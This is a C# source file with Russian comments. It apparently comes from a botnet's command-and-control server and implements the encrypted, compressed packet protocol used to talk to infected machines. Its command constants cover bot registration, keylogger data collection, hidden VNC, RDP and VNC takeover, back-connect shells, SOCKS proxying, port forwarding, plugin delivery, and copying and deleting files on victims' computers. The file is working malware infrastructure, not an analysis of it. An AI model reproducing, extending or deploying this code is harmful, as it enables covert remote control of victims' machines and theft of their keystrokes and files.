using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace Server
{
    public class Sender
    {
        Socket sc;
		TcpClient tcpSc;
		Stream sslStream;
        byte[] buffer;
        byte[] buffer2; //буфер для чтения пакета перед распаковкой
        byte[] bufferLzw; //буфер для распаковки и упаковки 
        int readedBuf = 0; //сколько байт в буфере
        int recvBytes = 0;
        int sendBytes = 0;
        LZW lzw;
		List<Socket> ls; //список сокетов для ожидания
		object lockWrite; //блокировка при записи пакета
		byte[] mask; //маска для шифрования
		int c_mask; //длина маски
		byte verPacket; //версия пакета
		Random rnd;
		public byte[] aesKey;

        public const int ID_VIDEO = 1;
        public const int ID_FILE_ADD = 2;
        public const int ID_FILE_NEW = 3;
        public const int ID_SIZE_FILE = 4;
        public const int ID_LIST_UIDS = 5;
        public const int ID_VNC_CONNECT = 6;
        public const int ID_PORT_FORWARD = 7;
        public const int ID_SET_UID = 8;
        public const int ID_PING = 9;
        public const int ID_INFO = 10; //какае-то информация для сервера
        public const int ID_OPEN_PORTFORWARD = 11; //пробрасывает порт (при общении с ботом)
        public const int ID_REG = 12; //регистрация бота
        public const int ID_CLOSE = 13; //удалить бота с сервера, бот закончил работу
        public const int ID_GET_PORTFORWARD = 14; //запрашивает номер порта через который идет проброс
        public const int ID_START_PORTFORWARD = 15; //команда серверу чтобы пробросил порт (при общении с левыми прогами)
        public const int ID_BREAK_VIDEO = 16; //разрыв видео (необходимо чтобы один файл видео не превышал определенный размер)
        public const int ID_EXIT = 17; //команда отсылаемая боту, чтобы он отключился от сервера (завершил свою работу с сервером)
        public const int ID_LOG = 18; //посылка строки лога
		public const int ID_VIDEO_BEG = 19; //начинает писать новое видео
		public const int ID_BOT_WORK = 20; //запрос у сервера выполняет ли бот какие-то дополнительные задачи (например проброс порта)
		public const int ID_RDP = 21; //полная настройка доступа по RDP
		public const int ID_VNC = 22; //полная настройка доступа по VNC
		public const int ID_BC = 23; //запуск BC (back connect)
		public const int ID_DUPL = 24; //запуск дублирующего соединения на строное бота, для упраления ботом сторонней прогой
		public const int ID_START_DUPL = 25; //старт дублирующего соединения
		public const int ID_GET_UIDS = 26; //запрос подключенных уидов
		public const int ID_CMD_BOT = 27; ////команда боту в виде текстовой строки: cmd arg1 arg2
		public const int ID_VNCDLL = 28; //полная настройка доступа по VNC
		public const int ID_SOCKS_ON_OFF = 29; //включить или отключить socks
		public const int ID_STREAM_RECREATE = 31; //пересоздание потока, используется при перезапуске сервера
		public const int ID_PLUGIN = 32; //загрузка плагина с сервера
		public const int ID_PIPE = 33; //отсылка данных pipe каналу

		public const int ID_FT_DIR = 34; //отсылает список файлов в указанной папке
		public const int ID_FT_COPY_SB = 35; //копирование файла с сервера на бот
		public const int ID_FT_COPY_BS = 36; //копирование файла с бота на сервер
		public const int ID_FT_MKDIR = 37; //создание папки на стороне бота
		public const int ID_FT_DEL = 38; //удаление файла или папки на стороне бота
		public const int ID_SET_UID2 = 39; //ид бота в новых версий бота
		public const int ID_XOR_MASK = 40; //маска для расшифровки-шифровки пакетов
		public const int ID_HVNC = 41; //полная настройка доступа по HVNC
		public const int ID_FT_STOPCOPY = 42; //прерывание процесса копирования файла
		public const int ID_SLEEP = 43; //отключиться на указанное количество минут

		public const int ID_SOCKS = 51; //данные для прокси 
        public const int ID_KEYLOGGER = 52; //прием данных кейлоггера
		public const int ID_STREAM_CREATE = 53; //создание потока
		public const int ID_STREAM_DATA = 54; //данные потока
		public const int ID_STREAM_CLOSE = 55; //закрытие потока
		public const int ID_PORTFORWARD_ON_OFF = 56; //включить или отключить проброс порта
		public const int ID_PORTFORWARD = 57; //данные для пробрасываемого порта
		public const int ID_SENDSTR = 58; //принимает или отправляет строку
		public const int ID_BC_PORT = 59; //со стороны бота идет коннект для бекконекта

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		unsafe struct Packet
		{
			public byte cmd;
			public byte ver; //версия заголовка
			public uint fullSize; //если пакет разбитый на части, то тут полный его размер
			public ushort size; //переданный размер
			public ushort num; //порядковый номер переданной части
			public byte type; //флаги: 1 - 0 - несжатый пакет, 1 - сжатый пакет; 2 - 1 - последняя часть пакета
			public uint id; //уникальный идентификатор пакета, который возвращается сервером, чтобы знать на какую команду пришел ответ
			public uint crc; //CRC32, пока не используется 
			public fixed byte reserve[5]; //резервируем до размера 24 байта
		};

        public Sender(Socket sc, TcpClient tcpSc, Stream stream)
        {
            this.sc = sc;
			this.tcpSc = tcpSc;
			sslStream = stream;
			sslStream.ReadTimeout = 18000;
            buffer = new byte[8192];
            buffer2 = new byte[8192];
            bufferLzw = new byte[8192];
            lzw = new LZW();
			ls = new List<Socket>();
			lockWrite = new object();
			mask = null;
			c_mask = 0;
			verPacket = 255;
			rnd = new Random();
		}

		public int Recv(byte[] buf, int from, int sz)
		{
			int c = 0;
			if (sc != null)
			{
				ls.Clear();
				ls.Add(sc);
				Socket.Select(ls, null, null, 180000000); //ждем 60 секунд
				if (ls.Count > 0)
				{
					c = sc.Receive(buf, from, sz, SocketFlags.None);
					if (c > 0)
						recvBytes += c;
					//else
					//	System.Diagnostics.Debug.WriteLine("-- 0 " + c.ToString());
				}
			}
			else
			{
				try
				{
					c = sslStream.Read(buf, from, sz);
					if (c > 0)
						recvBytes += c;
				}
				catch (Exception e)
				{
					c = 0;
				}
			}
			return c;
		}

        public int Send(byte[] buf, int from, int sz)
        {
			if (sc != null)
			{
				try
				{
					int c = sc.Send(buf, from, sz, SocketFlags.None);
					if (c > 0) sendBytes += c;
					return c;
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					sslStream.Write(buf, from, sz);
					sendBytes += sz;
					return sz;
				}
				catch
				{
				}
			}
			return 0;
        }

		bool ReadData(byte[] data, int c_data, int index)
		{
			//System.Diagnostics.Debug.WriteLine("ReadData(), readedBuf = " + readedBuf.ToString() + ", c_data = " + c_data.ToString());
			while (true)
			{
				if (readedBuf >= c_data) //приняли нужное количество байт
				{
					Array.Copy(buffer, 0, data, index, c_data);
					Array.Copy(buffer, c_data, buffer, 0, readedBuf - c_data); //смещаем остаток в начало буфера
					readedBuf -= c_data;
					return true;
				}
				int c = Recv(buffer, readedBuf, buffer.Length - readedBuf);
				if (c == 0)
					return false;
				/*
				string s = string.Empty;
				for (int i = 0; i < c; i++)
					s += buffer[readedBuf + i].ToString() + ' ';
				System.Diagnostics.Debug.WriteLine(s);
				*/
				readedBuf += c;
				//System.Diagnostics.Debug.WriteLine("readedBuf = " + readedBuf.ToString());
			}
		}

        bool WriteData(byte[] data, int offset, int c_data)
        {
            int c = Send(data, offset, c_data);
            if (c == 0)
                return false;
//			System.Diagnostics.Debug.WriteLine("-- write socket " + c_data.ToString());
            return true;
        }

		//для шифрования если размер данных кратен a, то зашифрованный фрагмент всегда на a больше
		static int Align(int sz, int a)
		{
			return (sz + a) / a * a;
		}

		byte[] ReadAndDecodedData(int c_data)
		{
			int sz = Align(c_data, aesKey == null ? 64 : 16);
			if( !ReadData(buffer2, sz, 0) )
				return null;
			try
			{
				if (aesKey != null)
					return DecodeAES(buffer2, sz);
				else
					return DecodeRSA(buffer2, sz);
			}
			catch
			{
				c_data.ToString();
			}
			return null;
		}

		public int ReadPacket(ref byte[] data, out int size, out uint id)
		{
			id = 0xffffffff;
			size = 0;
			int cmd = 0;
			while (true)
			{
				//читаем заголовок пакета
				byte[] m = ReadAndDecodedData(24);
				if (m == null)	return 0; 

				GCHandle handle = GCHandle.Alloc(m, GCHandleType.Pinned);
				Packet packet = (Packet)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(Packet));
				handle.Free();
				//System.Diagnostics.Debug.WriteLine("-- read packet id " + id.ToString() + ", size = " + sz.ToString()); 
				if (packet.num == 0 && (packet.type & 2) == 0) //первая часть разбитого пакета
				{
					if (data.Length < packet.fullSize)
						data = new byte[packet.fullSize];
				}

				if (packet.size > 0)
				{
					m = ReadAndDecodedData(packet.size);
					if (m == null)
						//System.Diagnostics.Debug.WriteLine("-- 3 " + packet.size.ToString() + " " + packet.cmd.ToString());
						return 0;
				}
				int sz = packet.size;
				cmd = packet.cmd;
				id = packet.id;
				verPacket = packet.ver;
				byte[] recvData = m;
				if (packet.ver >= 1)
				{
					//if (cmd == ID_SET_UID || cmd == ID_XOR_MASK ) //пришла маска для шифрования
					//{
					//	mask = new byte[sz];
					//	c_mask = sz;
					//	Array.Copy(buffer2, mask, sz);
					//}
					//else if (cmd != ID_BC_PORT)
					//{
					//	if (packet.ver >= 2)
					//		XorMask2(buffer2, 0, sz);
					//	else
					//		XorMask(buffer2, 0, sz);
					//}
				}
				if ((packet.type & 1) != 0) //запакованный
				{
					sz = lzw.from_lzw(m, bufferLzw);
					if (sz < 0)
					{
						//System.Diagnostics.Debug.WriteLine("error lzw: " + sz.ToString());
						//System.Diagnostics.Debug.WriteLine("--2"); 
						return 0;
					}
					recvData = bufferLzw;
				}
				Array.Copy(recvData, 0, data, size, sz);
				size += sz;
				if ((packet.type & 2) != 0) break;
			}
//			System.Diagnostics.Debug.WriteLine("-- read packet id " + id.ToString() + ", size = " + sz.ToString());
			return cmd;
		}

		//передаваемые данные в data портятся, поэтому их потом нельзя использовать
        public unsafe bool WritePacket(int cmd, uint id, byte[] data, int c_data)
        {
			bool ret = false;
			Packet packet;
			packet.cmd = (byte)cmd;
			packet.ver = verPacket == 255 ? (byte)1 : verPacket;
			packet.fullSize = (uint)c_data;
			packet.size = 0;
			packet.num = 0;
			packet.id = id;
			packet.crc = 0;
			packet.type = 0;
			int offset = 0;
			int c_p = Marshal.SizeOf(packet);
			byte[] p = new byte[c_p];
			lock (lockWrite)
			{
				do
				{
					packet.type = 0;
					int sz = c_data;
					if (sz > 4096)
						sz = 4096;
					else
						packet.type |= 2; //последняя часть 
					packet.size = (ushort)sz;
					if( packet.ver >= 3)
						for (int i = 0; i < 5; i++)
							packet.reserve[i] = (byte)rnd.Next(0, 255);
					//переводим структуру в байтовый массив
					GCHandle handle = GCHandle.Alloc(p, GCHandleType.Pinned);
					Marshal.StructureToPtr(packet, handle.AddrOfPinnedObject(), false);
					handle.Free();

					byte[] m = EncodeAES(p, 0, c_p);
					if (WriteData(m, 0, m.Length))
					{
						if (c_data > 0 )
						{
							m = EncodeAES(data, offset, sz);
							WriteData(m, 0, m.Length);
							ret = true;
						}
					}
					c_data -= sz;
					offset += sz;
					packet.num++;
				} while (c_data > 0);
			}
            return ret;
        }

        public void ResetBuffer()
        {
            readedBuf = 0;
        }

        public void Close()
        {
            sc.Close();
        }

		byte[] DecodeRSA(byte[] data, int c_data)
		{
			using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
			{
				rsa.ImportCspBlob(Program.privateKey);
				byte[] data2 = new byte[c_data];
				for (int i = 0; i < c_data; i++)
				{
					data2[i] = data[c_data - i - 1];
				}
				return rsa.Decrypt(data2, false);
			}
		}

		byte[] EncodeAES(byte[] data, int offset, int c_data)
		{
			using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
			{
				aes.Mode = CipherMode.CBC;
				aes.Key = aesKey;
				aes.IV = new byte[16];
				byte[] randVals = new byte[17];
				MemoryStream ms = new MemoryStream(c_data);
				CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(aes.Key, aes.IV), CryptoStreamMode.Write);
				cs.Write(data, offset, c_data);
				cs.Close();
				return ms.ToArray();
			}
		}

		byte[] DecodeAES(byte[] data, int c_data)
		{
			using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
			{
				aes.Mode = CipherMode.CBC;
				aes.Key = aesKey;
				aes.IV = new byte[16];
				System.IO.MemoryStream ms = new System.IO.MemoryStream();
				CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(aes.Key, aes.IV), CryptoStreamMode.Write);
				cs.Write(data, 0, c_data);
				cs.Close();
				return ms.ToArray();
			}
		}

        static public string GenUID()
        {
            string uid = string.Empty;
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface n in nics)
            {
                byte[] bs = n.GetPhysicalAddress().GetAddressBytes();
                Random rnd = new Random();
                int len = bs.Length > 12 ? 12 : bs.Length;
                for (int i = 0; i < len; i++)
                    uid += (bs[i] ^(byte)rnd.Next(255)).ToString("X2");
                if (len > 0) break;
            }
            return uid;
        }

        //возвращает строку заканчивающуюся нулем
        static public string GetCString(byte[] data, int start)
        {
            int i = start;
            //ищем нуль
            while (data[i] != 0 && i < data.Length) i++;
            return Encoding.ASCII.GetString(data, start, i - start);
        }

        static public void PutCString(string s, byte[] data, int start)
        {
            byte[] bs = Encoding.ASCII.GetBytes(s);
            Array.Copy(bs, 0, data, start, bs.Length);
            data[start + bs.Length] = 0;
        }

        public void SetSocket(Sender s)
        {
            sc = s.sc;
            ResetBuffer();
        }

        public IPEndPoint RemoteEndPoint
        {
            get { return (IPEndPoint)sc.RemoteEndPoint; }
        }

        public byte[] Buffer
        {
            get { return buffer; }
        }

        public int ReadedBuf
        {
            get { return readedBuf; }
        }

        public int RecvBytes
        {
            get { return recvBytes; }
        }

        public int SendBytes
        {
            get { return sendBytes; }
        }

        public Socket Socket
        {
            get { return sc; }
            set { sc = value; }
        }

        public bool Connected
        {
            get
            {
                if (sc == null) return false;
                return sc.Connected;
            }
        }
    }
}
